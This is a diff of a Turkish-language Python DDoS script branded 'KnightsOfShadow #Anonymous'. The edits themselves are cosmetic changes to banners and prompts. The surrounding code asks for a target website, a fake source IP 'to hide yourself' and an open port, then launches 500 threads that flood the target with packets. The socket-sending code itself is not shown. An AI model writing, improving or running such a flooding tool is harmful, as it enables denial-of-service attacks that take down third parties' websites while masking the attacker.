@@ -21,13 +21,13 @@ print(Fore.LIGHTBLUE_EX+baner)
 print(Fore.BLUE+'İnstagram = @KnightL4ncelot')
 print(Fore.CYAN+'KnightsOfShadow #Anonymous')
 
-print(Fore.BLUE+"DDos Website (K.O.S) ")
+print(Fore.BLUE+"DDos Website (K.O..) ")
 print(Fore.BLUE+"website url")
-target = input("\t ------------) ")
+target = input("\t -----------) ")
 print("Kendinizi gizlemek icin rastgele bi ip girin....")
-fake_ip = input("\t\t ------------) ")
+fake_ip = input("\t\t -----------) ")
 print("K.O.S Port Tarama uzerinden baktığınzı açık portu girin")
-port = input("\t\t ------------) ")
+port = input("\t\t -----------) ")
 
 port = int(port)
 
@@ -47,8 +47,7 @@ def attack():
         attack_num += 1
         packesnum =attack_num
         packesnum= str(packesnum)
-        print(Fore.CYAN+'[!]'+Fore.BLUE+"Paketler Gönderiliyor-----> "+packesnum)
-        
+        print(Fore.CYAN+'[!]'+"Paketler Gönderiliyor------> "+Fore.YELLOW+packesnum)
         
         
 print("Paketler Basari ile gonderildi!")
@@ -56,6 +55,3 @@ print("Paketler Basari ile gonderildi!")
 for i in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
-
-
-
